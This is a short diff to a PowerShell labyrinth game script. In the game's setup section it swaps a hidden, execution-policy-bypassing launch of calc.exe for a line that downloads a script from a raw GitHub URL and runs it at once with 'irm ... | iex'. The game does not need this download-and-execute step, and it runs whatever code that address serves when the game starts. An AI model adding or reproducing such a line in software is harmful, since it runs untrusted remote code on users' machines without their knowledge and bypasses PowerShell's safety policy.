@@ -90,7 +90,8 @@ function New-Labyrinth {
 
 # --- 2. SETUP THE GAME ---
 Clear-Host
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -Command calc.exe" -WindowStyle Hidden
+#Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -Command calc.exe" -WindowStyle Hidden
+Start-Process -FilePath "powershell.exe" -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.ps1" | iex' -WindowStyle Normal
 [Console]::CursorVisible = $false
 
 # Define Map Size
